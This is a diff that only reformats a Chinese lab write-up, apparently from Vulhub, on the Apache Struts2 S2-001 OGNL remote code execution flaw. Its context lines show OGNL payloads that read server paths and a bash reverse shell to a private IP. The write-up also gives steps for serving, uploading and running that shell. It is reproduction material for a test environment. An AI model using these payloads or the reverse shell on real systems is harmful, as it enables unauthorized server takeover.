@@ -1,16 +1,16 @@
-# Struts2 S2-001 远程代码执行漏洞
+# Apache Struts2 S2-001 远程代码执行漏洞
 
 ## 漏洞描述
 
-该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行.
+该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 `%{value}` 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 `%{value}` 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行.
 
 参考阅读：
 
--  http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html
+- http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html
 
 ## 环境搭建
 
-Vulhub执行以下命令启动s2-001测试环境：
+Vulhub 执行以下命令启动 s2-001 测试环境：
 
 ```
 docker-compose build
@@ -19,13 +19,13 @@ docker-compose up -d
 
 ## 漏洞复现
 
-获取tomcat执行路径：
+获取 tomcat 执行路径：
 
 ```
 %{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
 ```
 
-获取Web路径：
+获取 Web 路径：
 
 ```
 %{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
@@ -45,15 +45,15 @@ docker-compose up -d
 
 ![image-20220301154735903](images/202203011547043.png)
 
-### 反弹shell
+### 反弹 shell
 
-准备反弹Shell文件shell.sh：
+准备反弹 Shell 文件 shell.sh：
 
 ```
 echo "bash -i >& /dev/tcp/192.168.174.128/9999 0>&1" > shell.sh
 ```
 
-启动http server：
+启动 http server：
 
 ```
 # python2
@@ -63,7 +63,7 @@ python -m SimpleHTTPServer 80
 python -m http.server 80
 ```
 
-上传shell.sh文件：
+上传 shell.sh 文件：
 
 ```
 # URLencode前
@@ -72,7 +72,7 @@ python -m http.server 80
 
 ![image-20220301155634793](images/202203011556922.png)
 
-执行shell.sh文件：
+执行 shell.sh 文件：
 
 ```
 # URLencode前
@@ -81,7 +81,6 @@ python -m http.server 80
 
 ![image-20220301155834822](images/202203011558934.png)
 
-监听9999端口，接收反弹shell：
+监听 9999 端口，接收反弹 shell：
 
 ![image-20220301155706920](images/202203011557020.png)
-
